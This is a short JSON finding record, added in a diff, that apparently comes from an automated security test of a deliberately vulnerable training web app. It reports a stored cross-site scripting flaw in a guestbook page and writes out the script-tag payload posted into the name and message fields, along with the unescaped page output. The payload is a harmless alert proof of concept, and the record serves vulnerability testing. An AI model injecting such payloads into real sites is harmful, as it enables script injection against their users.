@@ -1,0 +1,10 @@
+{
+  "title": "Stored Cross-Site Scripting (XSS) in Guestbook",
+  "location": "/vulnerabilities/xss_s",
+  "severity": "high",
+  "proof": "POST txtName=<script>alert('XSS_NAME_1337')</script>&mtxMessage=<script>alert('XSS_PROOF_1337')</script> → stored entries appear unescaped in page: <div id=\"guestbook_comments\">Name: <script>alert('XSS_NAME_1337')</script><br />Message: <script>alert('XSS_PROOF_1337')</script><br /></div>",
+  "stage": "class_probe",
+  "precondition": "Authenticated session (low security level)",
+  "affected_actor": "admin",
+  "affected_resource": "vulnerability"
+}
